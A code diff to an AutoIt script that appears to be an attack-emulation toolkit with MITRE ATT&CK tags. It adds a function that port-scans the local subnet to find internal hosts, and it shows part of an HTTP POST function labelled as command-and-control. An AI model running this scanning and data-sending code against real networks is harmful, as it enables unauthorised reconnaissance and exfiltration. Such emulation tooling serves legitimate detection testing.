@@ -370,6 +370,28 @@ Func TCPscanner($ip,$port);DESCRIPTION:TCP scanner;MITRE:Discovery
    EndIf
 EndFunc
 
+Func InternalHostsFinder($port, $start_host, $stop_host)
+    $address = StringSplit(@IPAddress1, ".")
+    $network = $address[1] & "." & $address[2] & "." & $address[3] & "."
+    Local $hostsArray[1]
+
+    For $i = $start_host To $stop_host Step 1
+        If Not ($i = $address[4]) Then
+            $result = TCPscanner($network & $i, $port)
+            If $result = "open" Then
+                ReDim $hostsArray[UBound($hostsArray) + 1]
+                $hostsArray[UBound($hostsArray) - 1] = $network & $i
+            EndIf
+        EndIf
+    Next
+
+    If UBound($hostsArray) <= 1 Then
+        Return False
+    Else
+        Return $hostsArray
+    EndIf
+EndFunc
+
 Func HttpPost($ip, $tag, $port = "80", $sData = "");DESCRIPTION:Send data over Http;MITRE:Command and Control
    Local $oHTTP = ObjCreate("WinHttp.WinHttpRequest.5.1")
    $oHTTP.Open("POST", "http://" & $ip & ":" & $port, False)
